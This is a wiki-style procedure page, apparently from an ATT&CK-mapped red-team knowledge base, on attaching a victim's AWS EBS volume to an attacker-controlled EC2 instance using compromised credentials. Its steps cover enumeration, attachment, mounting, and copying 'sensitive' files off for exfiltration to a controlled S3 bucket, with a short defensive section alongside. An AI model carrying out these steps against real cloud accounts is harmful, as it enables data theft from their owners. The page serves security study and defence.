---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - '[[techniques/Data Transfer Size Limits|T1030 - Data Transfer Size Limits]]'
  - >-
    [[techniques/Modify Cloud Compute Infrastructure|T1578 - Modify Cloud
    Compute Infrastructure]]
sub_techniques:
  - '[[sub-techniques/Create Cloud Instance|T1578.002 - Create Cloud Instance]]'
tags:
  - '[[tags/Attaching-the-volume-to-an-instance]]'
  - '[[tags/Elastic-Block-Store]]'
  - '[[tags/Exploitation-Data-Exfiltration]]'
commands:
  - '[[commands/aws-ec2-attach-volume]]'
platforms:
  - AWS
tools:
  - '[[tools/AWS-CLI]]'
validated: true
---

# Attach-EBS-Volume-to-EC2-Instance

## Summary

This procedure demonstrates how to attach an Amazon Elastic Block Store (EBS) volume to an EC2 instance using the AWS CLI. In a malicious context, an attacker with compromised credentials can use this to mount a volume containing sensitive data to their controlled instance, enabling data access, exfiltration, or evasion of detection by moving data to a less monitored resource.

## Description

Elastic Block Store (EBS) provides persistent block storage for EC2 instances in AWS. Attaching an EBS volume to an instance exposes its file system, allowing read/write access. Attackers may exploit this by attaching victim-owned volumes to their instances to steal data without direct API calls that trigger alerts, or to stage data for exfiltration while bypassing size limits through incremental transfers. This technique modifies cloud infrastructure and can facilitate defense evasion by blending malicious activity with legitimate administrative actions. It requires IAM permissions for EC2 volume operations and is applicable in environments with multi-tenant or shared cloud resources.

## Requirements

1. Authenticated AWS CLI session with IAM permissions for `ec2:AttachVolume` (e.g., via compromised access keys or assumed role).
2. Knowledge of the target EBS volume ID and EC2 instance ID (obtainable via enumeration procedures like [[procedures/Enumerate-AWS-Resources]]).
3. AWS CLI installed and configured on the attacker's system.
4. The device name must not conflict with existing devices on the target instance.

## Defense

- Implement least-privilege IAM policies restricting `ec2:AttachVolume` to trusted roles and monitor usage via CloudTrail.
- Enable EBS encryption and volume-level access controls; use AWS Config rules to alert on unauthorized attachments.
- Segment resources with VPCs and monitor attachment events for anomalies, such as volumes attached to unexpected instances.

## Objectives

1. Mount an EBS volume to a controlled EC2 instance to access its contents.
2. Facilitate data exfiltration or persistence by integrating the volume into the attacker's infrastructure.
3. Evade detection by mimicking legitimate administrative volume management.

## Instructions

### Step 1: Identify Target Volume and Instance

**Context**: Before attachment, enumerate the EBS volume ID and EC2 instance ID to ensure accurate targeting. This prevents errors and confirms the resources are accessible.

Use AWS CLI commands to list volumes and instances if IDs are unknown.

> Run `aws ec2 describe-volumes` to list volumes and identify the target by tags or size.

> Run `aws ec2 describe-instances` to confirm the instance state is 'running'.

### Step 2: Attach the EBS Volume

**Context**: Execute the attachment using the AWS CLI to link the volume to the instance at a specified device path. This step modifies the cloud infrastructure, exposing the volume's file system on the instance.

**Command** ([[commands/aws-ec2-attach-volume]]):
```bash
aws ec2 attach-volume --volume-id $_VOLUME_ID --instance-id $_INSTANCE_ID --device $_DEVICE_NAME
```

> This command initiates the attachment process. Replace placeholders with actual values (e.g., vol-1234567890abcdef0 for volume ID, i-0abcd1234efgh5678 for instance ID, /dev/sdf for device). The device name should follow Linux conventions like /dev/sdX. Monitor the status until 'attached'.

### Step 3: Verify Attachment on the Instance

**Context**: SSH into the EC2 instance (if accessible) or use AWS Systems Manager to confirm the volume is mounted and accessible, ensuring the procedure succeeded.

Connect to the instance and run `lsblk` or `fdisk -l` to list block devices.

> If the volume contains a file system, mount it manually with `sudo mount /dev/$_DEVICE_NAME /mnt` and verify contents with `ls /mnt`.

### Step 4: Access or Exfiltrate Data

**Context**: Once attached, interact with the volume's data. For exfiltration, copy files to the instance and use tools like `aws s3 cp` to upload to a controlled bucket.

> Example: `sudo cp -r /mnt/sensitive/* /home/ec2-user/` then exfiltrate.

## Expected Output

Successful attachment returns a JSON response indicating the volume state:

```json
{
    "AttachTime": "2023-10-01T12:00:00.000Z",
    "Device": "/dev/sdf",
    "InstanceId": "i-0abcd1234efgh5678",
    "State": "attaching",
    "VolumeId": "vol-1234567890abcdef0"
}
```

On success, the state changes to "attached" when queried with `aws ec2 describe-volumes --volume-ids $_VOLUME_ID`.
